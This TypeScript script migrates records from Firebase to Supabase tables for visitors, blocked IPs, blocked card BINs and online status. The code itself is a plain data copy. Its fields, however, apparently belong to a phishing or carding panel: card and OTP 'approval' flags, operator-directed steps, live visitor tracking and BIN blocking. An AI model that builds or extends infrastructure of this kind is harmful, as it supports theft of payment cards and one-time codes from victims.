/**
 * One-shot data migration: Firestore "pays" + RTDB /status + settings/blockedIps
 * + blocked_bins  ->  Supabase Postgres (visitors, online_status, blocked_ips,
 * blocked_bins).
 *
 * Required env vars (already configured in this project):
 *   FIREBASE_SERVICE_ACCOUNT, FIREBASE_DATABASE_URL
 *   SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY
 *
 * Run with:
 *   tsx scripts/migrate-firestore-to-supabase.ts
 *
 * Safe to re-run: every write is an upsert keyed by id/ip/bin/visitor_id.
 */

import { cert, getApps, initializeApp } from "firebase-admin/app";
import { getFirestore } from "firebase-admin/firestore";
import { getDatabase } from "firebase-admin/database";
import { createClient } from "@supabase/supabase-js";

function loadServiceAccount(): any {
  const raw = process.env.FIREBASE_SERVICE_ACCOUNT;
  if (!raw) throw new Error("FIREBASE_SERVICE_ACCOUNT is missing.");
  const parsed = JSON.parse(raw);
  if (typeof parsed.private_key === "string") {
    parsed.private_key = parsed.private_key.replace(/\\n/g, "\n");
  }
  return parsed;
}

function initFirebase() {
  if (getApps().length > 0) return;
  const sa = loadServiceAccount();
  const databaseURL =
    process.env.FIREBASE_DATABASE_URL ||
    `https://${sa.project_id}-default-rtdb.firebaseio.com`;
  initializeApp({ credential: cert(sa), projectId: sa.project_id, databaseURL });
}

function chunk<T>(arr: T[], size: number): T[][] {
  const out: T[][] = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

async function main() {
  if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SERVICE_ROLE_KEY) {
    throw new Error("SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY missing.");
  }

  initFirebase();
  const fs = getFirestore();
  const supa = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY, {
    auth: { persistSession: false, autoRefreshToken: false },
  });

  /* -------- visitors (pays) -------- */
  const paysSnap = await fs.collection("pays").get();
  console.log(`[pays] read ${paysSnap.size} documents`);
  const visitorRows = paysSnap.docs.map((d) => {
    const data: any = d.data() || {};
    const id = String(data.id || d.id);
    const createdDate = typeof data.createdDate === "string" ? data.createdDate : new Date().toISOString();
    const updatedAt = typeof data.updatedAt === "string" ? data.updatedAt : new Date().toISOString();
    return {
      id,
      blocked: !!data.blocked,
      card_approved: !!data.cardApproved,
      otp_approved: !!data.otpApproved,
      directed_step: Number(data.directedStep) || 0,
      ip: data.ip || data.ipAddress || null,
      current_page: data.currentPage || null,
      data: { ...data, id, createdDate, updatedAt },
      created_date: createdDate,
      updated_at: updatedAt,
    };
  });
  for (const batch of chunk(visitorRows, 500)) {
    const { error } = await supa.from("visitors").upsert(batch, { onConflict: "id" });
    if (error) throw new Error(`visitors upsert failed: ${error.message}`);
  }
  console.log(`[pays] upserted ${visitorRows.length} visitors`);

  /* -------- blocked IPs -------- */
  try {
    const ipDoc = await fs.collection("settings").doc("blockedIps").get();
    if (ipDoc.exists) {
      const ips: string[] = Array.isArray(ipDoc.data()?.ips) ? ipDoc.data()!.ips : [];
      const rows = ips.map((ip) => ({ ip: String(ip).trim(), added_at: new Date().toISOString() })).filter(r => r.ip);
      if (rows.length) {
        const { error } = await supa.from("blocked_ips").upsert(rows, { onConflict: "ip" });
        if (error) throw new Error(`blocked_ips upsert failed: ${error.message}`);
      }
      console.log(`[blocked_ips] upserted ${rows.length} ips`);
    }
  } catch (err) {
    console.warn("[blocked_ips] skipped:", (err as Error).message);
  }

  /* -------- blocked BINs -------- */
  try {
    const binSnap = await fs.collection("blocked_bins").get();
    const rows = binSnap.docs.map((d) => {
      const v: any = d.data() || {};
      return {
        bin: String(v.bin || d.id),
        bank_name: v.bankName ?? null,
        card_brand: v.cardBrand ?? null,
        country: v.country ?? null,
        blocked_at: typeof v.blockedAt === "string" ? v.blockedAt : new Date().toISOString(),
      };
    });
    if (rows.length) {
      const { error } = await supa.from("blocked_bins").upsert(rows, { onConflict: "bin" });
      if (error) throw new Error(`blocked_bins upsert failed: ${error.message}`);
    }
    console.log(`[blocked_bins] upserted ${rows.length} bins`);
  } catch (err) {
    console.warn("[blocked_bins] skipped:", (err as Error).message);
  }

  /* -------- online_status (RTDB) -------- */
  try {
    const rtdb = getDatabase();
    const snap = await rtdb.ref("/status").get();
    const val = snap.val() || {};
    const rows = Object.keys(val).map((vid) => {
      const v = val[vid] || {};
      return {
        visitor_id: vid,
        online: v.online === true,
        last_seen: typeof v.lastSeen === "number" ? v.lastSeen : 0,
        updated_at: new Date().toISOString(),
      };
    });
    if (rows.length) {
      const { error } = await supa.from("online_status").upsert(rows, { onConflict: "visitor_id" });
      if (error) throw new Error(`online_status upsert failed: ${error.message}`);
    }
    console.log(`[online_status] upserted ${rows.length} records`);
  } catch (err) {
    console.warn("[online_status] skipped:", (err as Error).message);
  }

  console.log("✅ migration complete");
}

main().catch((err) => {
  console.error("❌ migration failed:", err);
  process.exit(1);
});
